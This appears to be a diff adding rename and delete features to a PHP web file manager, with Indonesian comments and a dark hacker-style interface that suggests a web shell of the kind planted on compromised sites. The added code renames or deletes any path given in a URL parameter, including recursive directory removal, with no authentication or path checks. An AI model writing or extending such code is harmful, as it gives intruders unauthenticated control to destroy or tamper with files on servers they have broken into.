@@ -193,6 +193,61 @@ if(isset($_GET['edit'])){
   exit;
 }
 
+// === fitur rename ===
+if (isset($_GET['rename'])) {
+    $target = $_GET['rename'];
+
+    // kalau belum submit, tampilkan form rename
+    if (!isset($_POST['rename_do'])) {
+        echo "<form method='post' style='text-align:center;margin-top:20px'>
+        <h3>Rename: ".htmlspecialchars(basename($target))."</h3>
+        <input type='text' name='newname' value='".htmlspecialchars(basename($target))."' 
+         style='width:300px;padding:6px;border-radius:4px;background:#0b0b18;color:#bfefff;
+         border:1px solid rgba(160,90,255,0.4);font-family:monospace;'>
+        <input type='hidden' name='rename_do' value='1'>
+        <input type='submit' value='Change Name'>
+        </form>";
+        exit;
+    }
+
+    // kalau sudah submit
+    if (isset($_POST['rename_do'])) {
+        $new = $lokasi.'/'.trim($_POST['newname']);
+        if (rename($target, $new)) {
+            echo "<center><span style='color:#6f6'>Renamed to: ".htmlspecialchars(basename($new))."</span></center>";
+        } else {
+            echo "<center><span style='color:#f66'>Failed to rename.</span></center>";
+        }
+        echo "<center><a href='?path=".urlencode($lokasi)."' style='color:#59d6ff'>Back</a></center>";
+        exit;
+    }
+}
+
+// === fitur delete ===
+if (isset($_GET['delete'])) {
+    $target = $_GET['delete'];
+
+    // kalau belum dikonfirmasi
+    if (!isset($_POST['delete_do'])) {
+        echo "<form method='post' style='text-align:center;margin-top:25px'>
+        <h3>Delete: ".htmlspecialchars(basename($target))."</h3>
+        <p>Are you sure you want to delete this ".(is_dir($target)?'directory':'file')."?</p>
+        <input type='hidden' name='delete_do' value='1'>
+        <input type='submit' value='Yes, Delete'>
+        <a href='?path=".urlencode($lokasi)."' style='margin-left:10px;color:#59d6ff;'>Cancel</a>
+        </form>";
+        exit;
+    }
+
+    // kalau sudah konfirmasi
+    if (isset($_POST['delete_do'])) {
+        if (is_dir($target)) xrmdir($target);
+        else @unlink($target);
+        echo "<center><span style='color:#6f6'>Deleted: ".htmlspecialchars(basename($target))."</span></center>";
+        echo "<center><a href='?path=".urlencode($lokasi)."' style='color:#59d6ff;'>Back</a></center>";
+        exit;
+    }
+}
 echo'<table><tr><th>Name</th><th>Size</th><th>Perm</th><th>Action</th></tr>';
 foreach($lokasinya as $f){
   if($f=='.'||$f=='..')continue;
